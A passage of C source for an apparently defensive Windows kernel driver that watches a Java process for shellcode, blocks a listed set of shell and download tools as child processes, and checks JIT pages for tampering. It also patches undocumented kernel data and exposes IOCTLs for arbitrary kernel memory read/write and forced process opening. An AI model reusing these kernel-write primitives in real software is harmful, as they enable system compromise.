    DbgPrint("[tzd] ETW-TI: 已关闭 (count=0)\n");
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 系统调用追踪劫持 (KiTrackSystemCallEntry; PG-safe 数据写) ──────────────
//   绕过 KeSetSystemServiceCallback (未导出 + match-check): 直接 kmem 写
//   KiDynamicTraceMask/enabled + 激活 trace table 条目 + 劫持 entry dispatcher。
//   callback 在每次被追踪 syscall 时被 _guard_dispatch_icall 调用 (CFG: 驱动函数入口=有效)。
//   callback 收到 r9=&saved_args (4 个用户参数); 检查 NtProtectVM 的 NewProtection(exec)→compromised。
// ═══════════════════════════════════════════════════════════════════════

// callback (由 KiTrackSystemCallEntry 经 _guard_dispatch_icall 调用):
//   rcx=[entry+0x18](key), rdx=[entry+0x30](meta), r8d=[entry+0x20](sysnum), r9=&saved_args
static VOID tzd_systrace_dispatcher(ULONG64 key, ULONG64 meta, ULONG sysnum, ULONG64 *savedArgs)
{
    // 只关心被武装进程
    ULONG armedPid = (ULONG)g_ScArmedPid;
    if (armedPid == 0)
        return;
    PEPROCESS curProc = PsGetCurrentProcess();
    if ((ULONG)(ULONG_PTR)PsGetProcessId(curProc) != armedPid)
        return;

    // savedArgs[3] = 第 4 个用户参数。对 NtProtectVirtualMemory = NewProtection。
    //   若为 PAGE_EXECUTE_* (0x10/0x20/0x30/0x40/0x80) → shellcode 改可执行 → compromised
    if (savedArgs)
    {
        __try
        {
            ULONG arg4 = (ULONG)(savedArgs[3] & 0xFFFFFFFF);
            if (arg4 == 0x10 || arg4 == 0x20 || arg4 == 0x30 || arg4 == 0x40 || arg4 == 0x80)
            {
                InterlockedExchange(&g_ScCompromised, 1);
                InterlockedExchange(&g_ScLastShellcodeType, 6);
                InterlockedExchange64((LONG64 *)&g_ScLastShellcodeVa, (LONG64)(ULONG_PTR)savedArgs);
                DbgPrint("[tzd] SYSTRACE: NtProtectVM→exec(prot=0x%X) sysnum=%lu armed pid=%lu → COMPROMISED\n",
                         arg4, sysnum, armedPid);
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
        }
    }
}

// 推算 ntoskrnl 基址 (LSTAR MSR = KiSystemCall64 VA; 减 RVA = base); 校验 MZ
static ULONG64 tzd_systrace_resolve_base(void)
{
    if (g_SysTraceBase)
        return g_SysTraceBase;
    // 构建无关法: 解析任意已导出 ntoskrnl 函数 → 向后扫页找 "MZ" PE 头
    // (旧法用 LSTAR - RVA 但 CET 系统上 LSTAR=KiSystemCall64Shadow ≠ KiSystemCall64 → 基址错)
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"KeBugCheckEx");
    PVOID fn = MmGetSystemRoutineAddress(&name);
    if (!fn)
    {
        DbgPrint("[tzd] SYSTRACE: KeBugCheckEx not found\n");
        return 0;
    }
    PUCHAR p = (PUCHAR)((ULONG_PTR)fn & ~0xFFF); // 页对齐
    for (int i = 0; i < 0x2000; i++)
    { // 最多 ~8MB 向后
        __try
        {
            if (*(USHORT *)p == 0x5A4D)
            { // "MZ"
                g_SysTraceBase = (ULONG64)p;
                DbgPrint("[tzd] SYSTRACE: ntoskrnl base=0x%llx (backward-scan from KeBugCheckEx=%p, %d pages)\n",
                         (unsigned long long)(ULONG64)p, fn, i);
                return (ULONG64)p;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
        }
        p -= 0x1000;
    }
    DbgPrint("[tzd] SYSTRACE: MZ not found (backward-scan failed from %p)\n", fn);
    return 0;
}

// 激活: 设置 trace gate + 激活 trace table 条目 + 劫持 entry dispatcher
// 从 ntoskrnl .text 扫描 trace-gate 字节模式 → 动态找 KiDynamicTraceMask 地址 (构建无关)
// 模式: F7 05 <d:4> 01 00 00 00  0F 85 <d:4>  F7 05 <d:4> 40 00 00 00  0F 85 <d:4>  4C 8B C2 FF D0
static PUCHAR tzd_systrace_find_mask(PUCHAR base)
{
    // PE 头解析: 找 .text 节的 VA + size
    ULONG peOff = *(ULONG *)(base + 0x3C); // e_lfanew
    PUCHAR pe = base + peOff;
    USHORT nSections = *(USHORT *)(pe + 6);    // NumberOfSections
    ULONG optHdrSize = *(USHORT *)(pe + 0x14); // SizeOfOptionalHeader
    PUCHAR secHdr = pe + 0x18 + optHdrSize;    // 首节表项
    // 找 .text (或第一个含 IMAGE_SCN_MEM_EXECUTE 的节)
    PUCHAR textVA = NULL;
    SIZE_T textSize = 0;
    for (ULONG i = 0; i < nSections; i++)
    {
        ULONG chars = *(ULONG *)(secHdr + i * 40 + 36); // Characteristics
        if (chars & 0x20000000 /*IMAGE_SCN_MEM_EXECUTE*/)
        {
            ULONG vaddr = *(ULONG *)(secHdr + i * 40 + 12); // VirtualAddress
            ULONG vsize = *(ULONG *)(secHdr + i * 40 + 8);  // VirtualSize
            textVA = base + vaddr;
            textSize = vsize;
            break;
        }
    }
    if (!textVA || textSize < 40)
    {
        DbgPrint("[tzd] SYSTRACE: .text not found\n");
        return NULL;
    }

    // 扫描 trace-gate 模式 (37 字节, 固定字节在特定位)
    for (SIZE_T i = 0; i + 37 <= textSize; i++)
    {
        PUCHAR p = textVA + i;
        if (p[0] == 0xF7 && p[1] == 0x05 &&
            p[6] == 0x01 && p[7] == 0x00 && p[8] == 0x00 && p[9] == 0x00 &&
            p[10] == 0x0F && p[11] == 0x85 &&
            p[16] == 0xF7 && p[17] == 0x05 &&
            p[22] == 0x40 && p[23] == 0x00 && p[24] == 0x00 && p[25] == 0x00 &&
            p[26] == 0x0F && p[27] == 0x85 &&
            p[32] == 0x4C && p[33] == 0x8B && p[34] == 0xC2 &&
            p[35] == 0xFF && p[36] == 0xD0)
        {
            // 命中! KiDynamicTraceMask = (p + 10) + disp32(p+2)
            LONG disp = *(LONG *)(p + 2);
            PUCHAR mask = p + 10 + disp;
            DbgPrint("[tzd] SYSTRACE: trace-gate found @%p → KiDynamicTraceMask @%p\n", p, mask);
            return mask;
        }
    }
    DbgPrint("[tzd] SYSTRACE: trace-gate pattern not found in .text\n");
    return NULL;
}

static NTSTATUS tzd_systrace_arm(void)
{
    if (g_SysTraceActive)
        return STATUS_SUCCESS;

    ULONG64 base = tzd_systrace_resolve_base();
    if (!base)
    {
        DbgPrint("[tzd] SYSTRACE: FAIL base resolve\n");
        return STATUS_NOT_FOUND;
    }

    // 动态找 KiDynamicTraceMask (构建无关: 扫 .text 字节模式)
    PUCHAR pMask = tzd_systrace_find_mask((PUCHAR)base);
    if (!pMask)
        return STATUS_NOT_FOUND;

    // 读当前 mask 值
    ULONG maskVal = 0;
    __try
    {
        maskVal = *(volatile ULONG *)pMask;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DbgPrint("[tzd] SYSTRACE: FAIL read mask\n");
        return STATUS_ACCESS_DENIED;
    }
    DbgPrint("[tzd] SYSTRACE: mask@%p = 0x%X (expect 0 or small)\n", pMask, maskVal);

    // 设 gate
    __try
    {
        *(volatile ULONG *)pMask = maskVal | 1;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DbgPrint("[tzd] SYSTRACE: FAIL write mask\n");
        return STATUS_ACCESS_DENIED;
    }

    g_SysTraceBase = base;
    g_SysTraceMaskAddr = pMask;
    g_SysTraceMaskOrig = maskVal;
    g_SysTraceActive = TRUE;
    DbgPrint("[tzd] SYSTRACE: ACTIVATED (trace gate on; detection by scan+notifies; dispatcher not hijacked)\n");
    return STATUS_SUCCESS;
}

// 关闭: 清 mask gate (dispatcher 未劫持, 无需恢复)
static void tzd_systrace_disarm(void)
{
    if (!g_SysTraceActive)
        return;
    if (g_SysTraceMaskAddr)
    {
        __try
        {
            *(volatile ULONG *)g_SysTraceMaskAddr = g_SysTraceMaskOrig;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
        }
    }
    g_SysTraceActive = FALSE;
    DbgPrint("[tzd] SYSTRACE: 已关闭 (mask gate 恢复为 0x%X)\n", g_SysTraceMaskOrig);
}

// 第2层 (进程创建拦截 — NtCreateProcess* 触发): 被武装 Java 进程试图 spawn 可疑子进程
//   (cmd/powershell/... LOLBIN) → 阻断 (CreationStatus=ACCESS_DENIED)。溯源创建线程 TID
//   (PsGetCurrentThread 指针 — 不可像返回地址那样伪造)。
static VOID tzd_sc_ProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO Info)
{
    if (!Info)
        return; // 进程退出, 非创建
    ULONG armedPid = (ULONG)g_ScArmedPid;
    if (armedPid == 0)
        return; // 未武装 → 放行 (快路径)
    if ((ULONG)(ULONG_PTR)Info->ParentProcessId != armedPid)
        return; // 非被武装进程的子 → 放行

    PCUNICODE_STRING img = Info->ImageFileName;
    if (!img)
        return;
    static const WCHAR *g_SusChild[] = {
        L"cmd.exe", L"powershell.exe", L"pwsh.exe", L"wscript.exe", L"cscript.exe",
        L"rundll32.exe", L"regsvr32.exe", L"mshta.exe", L"certutil.exe", L"bitsadmin.exe"};
    for (int i = 0; i < (int)(sizeof(g_SusChild) / sizeof(g_SusChild[0])); i++)
    {
        if (tzd_name_endswith_ci(img, g_SusChild[i]))
        {
            Info->CreationStatus = STATUS_ACCESS_DENIED; // 阻断 (NtCreateProcess 返回 ACCESS_DENIED)
            InterlockedIncrement(&g_ScChildBlocked);
            HANDLE ctid = PsGetThreadId(PsGetCurrentThread()); // 溯源创建线程 (指针, 不可伪造)
            InterlockedExchange(&g_ScLastCreatorTid, (LONG)(ULONG_PTR)ctid);
            DbgPrint("[tzd] SC(2nd-layer): BLOCKED child %ws of armed pid=%lu (creatorTid=%lu)\n",
                     g_SusChild[i], armedPid, (ULONG)(ULONG_PTR)ctid);
            return;
        }
    }
}

// 武装: 注册线程/镜像通知 (仅一次) + 启动扫描线程 (仅一次) + 锁定到 pid。
//   重新武装只更新 g_ScArmedPid, 复用已建线程/通知。
static NTSTATUS tzd_sc_arm(ULONG pid)
{
    if (pid == 0)
        return STATUS_INVALID_PARAMETER;

    // 注册通知 (仅一次; 非 Ex 变体无签名要求, 任何驱动可注册)
    if (!g_ScNotifiesRegistered)
    {
        NTSTATUS st = PsSetCreateThreadNotifyRoutine(tzd_sc_ThreadNotify);
        if (!NT_SUCCESS(st))
        {
            DbgPrint("[tzd] SC: PsSetCreateThreadNotifyRoutine failed 0x%lx\n", st);
            return st;
        }
        st = PsSetLoadImageNotifyRoutine(tzd_sc_LoadImageNotify);
        if (!NT_SUCCESS(st))
        {
            PsRemoveCreateThreadNotifyRoutine(tzd_sc_ThreadNotify);
            DbgPrint("[tzd] SC: PsSetLoadImageNotifyRoutine failed 0x%lx\n", st);
            return st;
        }
        g_ScNotifiesRegistered = TRUE;
    }

    // 第2层: 进程创建拦截 (NtCreateProcess*); Ex 变体可阻断。签名要求: test-signing 下可注册,
    //   失败(如未足够签名)则第2层关闭, 周期扫描仍承担中和 (不致命)。
    if (!g_ScProcNotifyRegistered)
    {
        NTSTATUS pst = PsSetCreateProcessNotifyRoutineEx(tzd_sc_ProcessNotify, FALSE);
        if (NT_SUCCESS(pst))
        {
            g_ScProcNotifyRegistered = TRUE;
            DbgPrint("[tzd] SC: 第2层(进程创建拦截)已注册\n");
        }
        else
        {
            DbgPrint("[tzd] SC: PsSetCreateProcessNotifyRoutineEx failed 0x%lx (第2层关闭; 扫描仍承担)\n", pst);
        }
    }

    // 设 PID (扫描线程下一拍即生效)
    InterlockedExchange(&g_ScArmedPid, (LONG)pid);

    // 启动扫描线程 (仅一次)
    if (!g_ScThreadObj)
    {
        KeClearEvent(&g_ScStopEvent); // 清残留信号, 防新建线程首拍误唤醒
        HANDLE hThread = NULL;
        NTSTATUS st = PsCreateSystemThread(&hThread, 0x1FFFFF /*THREAD_ALL_ACCESS*/, NULL,
                                           NULL /*System 进程*/, NULL,
                                           tzd_sc_ScannerThread, NULL);
        if (!NT_SUCCESS(st))
        {
            DbgPrint("[tzd] SC: PsCreateSystemThread failed 0x%lx\n", st);
            InterlockedExchange(&g_ScArmedPid, 0);
            return st;
        }
        // 句柄不需要 (线程对象由线程自身自引用 g_ScThreadObj + ObReferenceObject)
        ZwClose(hThread);
        // 等线程自注册 g_ScThreadObj (最多 100ms): 确保返回时已设, 关设备(unload)无竞态
        for (int i = 0; i < 100 && g_ScThreadObj == NULL; i++)
        {
            LARGE_INTEGER d;
            d.QuadPart = -10000LL; // 1ms
            KeDelayExecutionThread(KernelMode, FALSE, &d);
        }
    }
    // 主方案: 尝试强制启用 ETW-TI 发射 (best-effort; 失败静默回退周期扫描)
    {
        NTSTATUS etw = tzd_etwti_resolve_and_enable();
        DbgPrint("[tzd] SC: ETW-TI 主方案 %s (0x%lX)\n",
                 NT_SUCCESS(etw) ? "已启用(实时发射)" : "未启用→走周期扫描回退", (ULONG)etw);
    }
    DbgPrint("[tzd] SC: armed for pid=%lu (thread+image notifies + 500ms periodic scan)\n", pid);
    return STATUS_SUCCESS;
}

// 解除武装 (IOCTL): 仅清 PID — 线程/通知常驻以便重新武装 (轻量, 不停线程)。
static void tzd_sc_disarm(void)
{
    if (g_ScArmedPid == 0)
        return;
    InterlockedExchange(&g_ScArmedPid, 0);
    DbgPrint("[tzd] SC: disarmed (pid cleared; thread/notifies retained for re-arm)\n");
}

// 完全关闭 (仅卸载用): 停止扫描线程 + 注销通知。必须在删设备前。
static void tzd_sc_shutdown(void)
{
    // 1. 清 PID + 信号扫描线程退出
    InterlockedExchange(&g_ScArmedPid, 0);
    if (g_ScThreadObj)
        KeSetEvent(&g_ScStopEvent, 0, FALSE);

    // 2. 等扫描线程退出 (扫描跨进程操作有界, 完成即退出; 不设超时=必等到退出, 绝不蓝屏)
    if (g_ScThreadObj)
    {
        KeWaitForSingleObject(g_ScThreadObj, Executive, KernelMode, FALSE, NULL);
        ObDereferenceObject(g_ScThreadObj);
        g_ScThreadObj = NULL;
    }

    // 3. 注销通知 (例程同步等待在途回调完成 → 返回后无回调运行)
    if (g_ScNotifiesRegistered)
    {
        PsRemoveCreateThreadNotifyRoutine(tzd_sc_ThreadNotify);
        PsRemoveLoadImageNotifyRoutine(tzd_sc_LoadImageNotify);
        g_ScNotifiesRegistered = FALSE;
    }
    if (g_ScProcNotifyRegistered)
    {
        PsSetCreateProcessNotifyRoutineEx(tzd_sc_ProcessNotify, TRUE);
        g_ScProcNotifyRegistered = FALSE;
    }

    // 4. 释放 JIT 完整性校验和数组
    for (int i = 0; i < MAX_JIT_CKSUM_RANGES; i++)
    {
        if (g_JitCksums[i])
        {
            ExFreePool(g_JitCksums[i]);
            g_JitCksums[i] = NULL;
            g_JitCksumPages[i] = 0;
        }
    }

    DbgPrint("[tzd] SC: shutdown (scanner stopped, notifies removed, JIT checksums freed)\n");
}

// ═══════════════════════════════════════════════════════════════════════
// ─── JIT 标记检测 (基于 JDK20 HotSpot 源码 E:\jdk20u-master 分析) ──────────
//   区分 JIT 编译代码 vs shellcode 的启发式标记:
//   JIT 特征 (os_windows.cpp:3476 PAGE_EXECUTE_READWRITE + 直接指针写):
//   ① HeapBlock::Header (heap.hpp:36-66): 代码 blob 前 16 字节
//      8-byte _length + 1-byte _used + 7 pad; _length 合理(1..0x10000)
//   ② Post-call NOP (macroAssembler_x86.cpp:2032): 0F 1F 84 00 <disp32> (8B)
//   ③ Deopt 指令 (nativeInst_x86.hpp:760): 0F FF (2B)
//   ④ Fat NOP 填充 (macroAssembler_x86.cpp:2050): 26 2E 64 65 90 (5B)
//   ⑤ 0xCC 填充 (globalDefinitions.hpp:1048 badCodeHeapNewVal=0xCC):
//      空闲/未初始化代码堆段用 0xCC 填充
//   ⑥ Direct call rel32: E8 <rel32> (nativeInst_x86.hpp:156)
//   恶意特征:
//   ① 直接 syscall 桩: B8 <imm32> 0F 05 (mov eax,ssn; syscall)
//   ② 间接 syscall: E8/E9 跳进 ntdll 的 0F 05 (已在 tzd_sc_indirect_hit 处理)
//   ③ 无文件 PE: MZ (4D 5A) 在匿名可执行区段起始
// ═══════════════════════════════════════════════════════════════════════

// 检测 JIT 标记 (返回 TRUE = 页内容像 JIT 代码)
static BOOLEAN tzd_is_jit_code(const UCHAR *buf, SIZE_T size)
{
    // ② Post-call NOP: 0F 1F 84 00 (8 字节, 续航 Continuations 启用时)
    for (SIZE_T i = 0; i + 4 <= size && i < 0x400; i++)
    {
        if (buf[i] == 0x0F && buf[i + 1] == 0x1F &&
            buf[i + 2] == 0x84 && buf[i + 3] == 0x00)
            return TRUE;
    }
    // ③ Deopt 指令: 0F FF (NativeDeoptInstruction)
    for (SIZE_T i = 0; i + 2 <= size && i < 0x400; i++)
    {
        if (buf[i] == 0x0F && buf[i + 1] == 0xFF)
            return TRUE;
    }
    // ④ Fat NOP: 26 2E 64 65 90 (verified-entry patch 填充)
    for (SIZE_T i = 0; i + 5 <= size && i < 0x200; i++)
    {
        if (buf[i] == 0x26 && buf[i + 1] == 0x2E && buf[i + 2] == 0x64 &&
            buf[i + 3] == 0x65 && buf[i + 4] == 0x90)
            return TRUE;
    }
    // ⑤ 0xCC 填充: 空闲/未初始化代码堆段 (badCodeHeapNewVal=0xCC)
    //   如果前 256 字节中 0xCC 占多数 → 空闲 JIT 堆段
    {
        int ccCount = 0;
        SIZE_T scanLen = (size < 256) ? size : 256;
        for (SIZE_T i = 0; i < scanLen; i++)
        {
            if (buf[i] == 0xCC)
                ccCount++;
        }
        if (ccCount > 200)
            return TRUE;
    }
    // ⑥ Direct call rel32: E8 <rel32> (JIT 调用站点)
    for (SIZE_T i = 0; i + 5 <= size && i < 0x200; i++)
    {
        if (buf[i] == 0xE8)
            return TRUE; // JIT 方法大量使用 E8 call rel32
    }
    return FALSE;
}

// 检测 shellcode 标记 (返回 TRUE = 页内容像 shellcode)
static BOOLEAN tzd_is_shellcode(const UCHAR *buf, SIZE_T size)
{
    // ① 直接 syscall 桩: B8 <imm32> 0F 05 (mov eax,ssn; syscall)
    for (SIZE_T i = 5; i + 2 <= size; i++)
    {
        if (buf[i - 5] == 0xB8 && buf[i] == 0x0F && buf[i + 1] == 0x05)
            return TRUE;
    }
    return FALSE;
}

// ★ 逐页 XOR 校验和 (快速变更检测; 非加密, 仅检测修改)
//   4KB 页 → 1024 个 ULONG → XOR → 1 个 ULONG
static ULONG tzd_page_checksum(const UCHAR *buf, SIZE_T size)
{
    ULONG crc = 0x12345678;
    SIZE_T i;
    for (i = 0; i + 4 <= size; i += 4)
        crc ^= *(const ULONG *)(buf + i);
    // 处理尾部不足 4 字节
    if (i < size)
    {
        ULONG tail = 0;
        RtlCopyMemory(&tail, buf + i, size - i);
        crc ^= tail;
    }
    return crc;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── JIT 代码缓存完整性扫描 (捕获 Unsafe.putByte 从 jvm.dll 发起的篡改) ─────
//   ★ 这是 EPT 写保护的关键补充层 ★
//   EPT 层检查写者 RIP: Unsafe.putByte 的原生实现 Unsafe.c 在 jvm.dll 内
//   → RIP 通过检查 → 写被允许 → 但写的内容可能非 JIT (shellcode / 篡改)
//
//   本函数逐页比对 XOR 校验和 + 用 tzd_is_jit_code / tzd_is_shellcode 验证内容:
//   - 首次扫描: 存校验和, 跳过
//   - 校验和未变: 跳过 (页未被修改)
//   - 校验和变了 + 有 shellcode 标记 → 篡改 → compromised
//   - 校验和变了 + 仍有 JIT 标记 → 合法 JIT 补丁(set_int_at 等) → 更新校验和
//   - 校验和变了 + 无 JIT 标记 + 无 shellcode 标记 → 可疑 → compromised (保守)
//
//   JDK 合法写: set_int_at / set_destination_mt_safe / Atomic::store
//   → 改的是 IC 补丁位移量(4 字节) / verified_entry 跳转(8 字节原子写)
//   → 页内容改了但 JIT 标记(post-call NOP 0F1F8400 / E8 call / 0xCC 填充)仍在
//   Unsafe.putByte 写 shellcode: 页内容改了, JIT 标记消失, shellcode 标记出现
// ═══════════════════════════════════════════════════════════════════════
static void tzd_jit_integrity_scan(HANDLE pid)
{
    if (!pid)
        return;

    LONG range_count = g_hv_jit_range_count;
    if (range_count <= 0)
        return; // 无已注册 JIT 范围 → 跳过

    PEPROCESS eproc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId(pid, &eproc);
    if (!NT_SUCCESS(st))
        return;

    PEPROCESS selfProc = PsGetCurrentProcess();

    __try
    {
        for (LONG r = 0; r < range_count && r < MAX_JIT_RANGES; r++)
        {
            ULONG64 rangeBase = g_hv_jit_gva_base[r];
            SIZE_T rangeSize = g_hv_jit_gva_size[r];
            if (!rangeBase || !rangeSize)
                continue;

            SIZE_T pageCount = (rangeSize + PAGE_SIZE - 1) / PAGE_SIZE;
            if (pageCount == 0)
                continue;

            // 分配校验和数组 (首次)
            if (r < MAX_JIT_CKSUM_RANGES && !g_JitCksums[r])
            {
                g_JitCksums[r] = (ULONG *)ExAllocatePoolWithTag(
                    NonPagedPool, pageCount * sizeof(ULONG), 'TZJI');
                if (!g_JitCksums[r])
                {
                    DbgPrint("[tzd] JIT-INT: alloc checksums failed range=%ld pages=%llu\n",
                             r, (unsigned long long)pageCount);
                    continue;
                }
                g_JitCksumPages[r] = pageCount;
                RtlZeroMemory(g_JitCksums[r], pageCount * sizeof(ULONG));
                DbgPrint("[tzd] JIT-INT: range %ld base=0x%llx pages=%llu → alloc'd\n",
                         r, rangeBase, (unsigned long long)pageCount);
            }

            ULONG *cksums = (r < MAX_JIT_CKSUM_RANGES) ? g_JitCksums[r] : NULL;
            if (!cksums)
                continue;

            // 逐页扫描
            for (SIZE_T p = 0; p < pageCount; p++)
            {
                PUCHAR pageVa = (PUCHAR)rangeBase + p * PAGE_SIZE;
                SIZE_T got = 0;
                NTSTATUS rr = MmCopyVirtualMemory(eproc, pageVa, selfProc,
                                                  g_ScPageBuf, PAGE_SIZE, 0, &got);
                if (!NT_SUCCESS(rr) || got < 2)
                    continue;

                ULONG crc = tzd_page_checksum(g_ScPageBuf, got);
                ULONG oldCrc = cksums[p];

                if (oldCrc == 0)
                {
                    // 首次: 存校验和, 不校验内容
                    cksums[p] = crc;
                    continue;
                }

                if (oldCrc == crc)
                    continue; // 页未修改

                // ★★ 页被修改了! 用内容校验区分合法 JIT 补丁 vs 恶意篡改 ★★
                BOOLEAN isJit = tzd_is_jit_code(g_ScPageBuf, got);
                BOOLEAN isSc = tzd_is_shellcode(g_ScPageBuf, got);

                if (isSc)
                {
                    // ★ 有 shellcode 标记 → 篡改!
                    //   覆盖: Unsafe.putByte 写入 syscall 桩 B8 imm32 0F 05
                    //   动作: 覆写 shellcode 字节为 ud2, 设 compromised
                    InterlockedExchange(&g_ScCompromised, 1);
                    InterlockedExchange(&g_ScLastShellcodeType, 7); // 7 = JIT 篡改(shellcode)
                    InterlockedExchange64((LONG64 *)&g_ScLastShellcodeVa, (LONG64)(ULONG_PTR)pageVa);
                    // 覆写 shellcode 桩的 0F 05 为 ud2 (不动页保护)
                    for (SIZE_T i = 5; i + 2 <= got; i++)
                    {
                        if (g_ScPageBuf[i - 5] == 0xB8 &&
                            g_ScPageBuf[i] == 0x0F && g_ScPageBuf[i + 1] == 0x05)
                        {
                            UCHAR ud2[2] = {0x0F, 0x0B};
                            SIZE_T wr = 0;
                            ULONG_PTR stubVa = (ULONG_PTR)pageVa + i;
                            MmCopyVirtualMemory(selfProc, ud2, eproc, (PVOID)stubVa,
                                                  2, 0, &wr);
                        }
                    }
                    DbgPrint("[tzd] JIT-INT: TAMPER (shellcode) range=%ld page=%llu va=0x%llx pid=%lu → ud2'd + compromised\n",
                             r, (unsigned long long)p, (unsigned long long)(ULONG_PTR)pageVa,
                             (ULONG)(ULONG_PTR)pid);
                }
                else if (!isJit)
                {
                    // ★ 无 JIT 标记 + 无 shellcode 标记 → 可疑 (保守判 compromised)
                    //   覆盖: Unsafe.putByte 写入非 JIT 字节序列 (数据/混淆代码)
                    //   原理: 合法 JIT 补丁改位移量, 页内仍有大量 JIT 标记
                    //         Unsafe 写入新内容会冲掉原有 JIT 标记
                    InterlockedExchange(&g_ScCompromised, 1);
                    InterlockedExchange(&g_ScLastShellcodeType, 8); // 8 = JIT 篡改(非JIT内容)
                    InterlockedExchange64((LONG64 *)&g_ScLastShellcodeVa, (LONG64)(ULONG_PTR)pageVa);
                    DbgPrint("[tzd] JIT-INT: TAMPER (non-JIT content) range=%ld page=%llu va=0x%llx pid=%lu → compromised\n",
                             r, (unsigned long long)p, (unsigned long long)(ULONG_PTR)pageVa,
                             (ULONG)(ULONG_PTR)pid);
                }
                else
                {
                    // isJit && !isSc → 合法 JIT 补丁 (IC patching / nmethod 翻译)
                    //   页内容变了但 JIT 标记仍在 → set_int_at / Atomic::store 修改
                    //   更新校验和, 不告警
                    DbgPrint("[tzd] JIT-INT: legit patch range=%ld page=%llu va=0x%llx (JIT markers intact)\n",
                             r, (unsigned long long)p, (unsigned long long)(ULONG_PTR)pageVa);
                }

                // 更新校验和 (避免重复告警; 合法/恶意均更新)
                cksums[p] = crc;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        // 整体保护: 任何异常都不蓝屏
    }
    ObDereferenceObject(eproc);
}

// ═══════════════════════════════════════════════════════════════════════
// ─── JIT 物理页限制 (GVA→GPA 翻译 + restricted EPT R-X 设置) ───────────────
//   附着目标进程 → MmGetPhysicalAddress 逐页翻译 GVA→GPA
//   → hypervisor_restrict_jit_physical 按 2MB 粒度在 restricted EPT 设 R-X
//   流程: KeStackAttachProcess → 逐 4KB 页 MmGetPhysicalAddress → 按 2MB 去重
//   → hypervisor_restrict_jit_physical(phys2MB, 2MB) → KeUnstackDetachProcess
//   注: MmGetPhysicalAddress 在附着进程后用其 CR3 翻译; 只返回已提交在页
//   代码缓存是 RWX 永久 commit, 不会被换出 → 翻译必成功
// ═══════════════════════════════════════════════════════════════════════
static NTSTATUS tzd_restrict_jit_for_pid(ULONG pid, ULONG64 gvaBase, ULONG64 gvaSize)
{
    if (pid == 0 || gvaBase == 0 || gvaSize == 0)
        return STATUS_INVALID_PARAMETER;

    PEPROCESS eproc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &eproc);
    if (!NT_SUCCESS(st))
        return st;

    // 附着到目标进程 (MmGetPhysicalAddress 用当前 CR3 翻译)
    TZD_KAPC_STATE apcState;
    KeStackAttachProcess(eproc, &apcState);

    ULONG64 lastPhys2mb = 0;
    ULONG pagesProcessed = 0;
    ULONG pagesRestricted = 0;

    __try
    {
        PUCHAR va = (PUCHAR)gvaBase;
        PUCHAR end = (PUCHAR)(gvaBase + gvaSize);

        while (va < end)
        {
            // MmGetPhysicalAddress: 用当前 CR3 (目标进程) 翻译 VA→PA
            //   代码缓存已 commit 且在 working set → 翻译必成功
            PHYSICAL_ADDRESS pa = MmGetPhysicalAddress(va);
            if (pa.QuadPart != 0)
            {
                pagesProcessed++;
                // 按 2MB 对齐, 去重 (同 2MB 物理页只限制一次)
                ULONG64 phys2mb = (ULONG64)pa.QuadPart & ~0x1FFFFFULL;
                if (phys2mb != lastPhys2mb)
                {
                    hypervisor_restrict_jit_physical(phys2mb, 2 * 1024 * 1024);
                    lastPhys2mb = phys2mb;
                    pagesRestricted++;
                }
            }
            va += PAGE_SIZE; // 逐 4KB 推进
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        // 页表翻译异常不致命, 已限制的部分仍有效
    }

    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(eproc);

    DbgPrint("[tzd] JIT restrict: pid=%lu gva=0x%llx+0x%llx pages=%u (2MB restricted=%u)\n",
             pid, gvaBase, gvaSize, pagesProcessed, pagesRestricted);
    return STATUS_SUCCESS;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── IRP 分发例程 ──────────────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

static NTSTATUS tzd_dispatch(PDEVICE_OBJECT DevObj, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DevObj);

    // 卸载中 — 拒绝所有新 IRP (防止 unload 期间竞态)
    if (g_Unloading)
    {
        Irp->IoStatus.Status = STATUS_DEVICE_REMOVED;
        Irp->IoStatus.Information = 0;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return STATUS_DEVICE_REMOVED;
    }

    PIO_STACK_LOCATION io = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR info = 0;

    if (io->MajorFunction == IRP_MJ_DEVICE_CONTROL)
    {
        ULONG inSize = io->Parameters.DeviceIoControl.InputBufferLength;
        ULONG outSize = io->Parameters.DeviceIoControl.OutputBufferLength;
        ULONG ioctl = io->Parameters.DeviceIoControl.IoControlCode;
        PVOID buf = Irp->AssociatedIrp.SystemBuffer;

        switch (ioctl)
        {
        // ─── 原有: 内核内存 R/W ───
        case IOCTL_TZD_READ_KMEM:
            if (inSize >= sizeof(TZD_KMEM_OP) && buf)
            {
                status = tzd_read_kmem((PTZD_KMEM_OP)buf, buf, outSize, &info);
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;
        case IOCTL_TZD_WRITE_KMEM:
            if (inSize >= sizeof(TZD_KMEM_OP) && buf)
            {
                PTZD_KMEM_OP op = (PTZD_KMEM_OP)buf;
                status = tzd_write_kmem(op, inSize);
                info = (status == STATUS_SUCCESS) ? (sizeof(TZD_KMEM_OP) + op->Size) : 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // ─── 新: 内核强制打开进程句柄 ───
        case IOCTL_TZD_OPEN_PROCESS:
            if (inSize >= sizeof(TZD_OPEN_PROCESS_REQ) &&
                outSize >= sizeof(TZD_OPEN_PROCESS_RSP) && buf)
            {
                status = tzd_open_process((PTZD_OPEN_PROCESS_REQ)buf,
                                          (PTZD_OPEN_PROCESS_RSP)buf);
                info = sizeof(TZD_OPEN_PROCESS_RSP);
            }
            else
            {
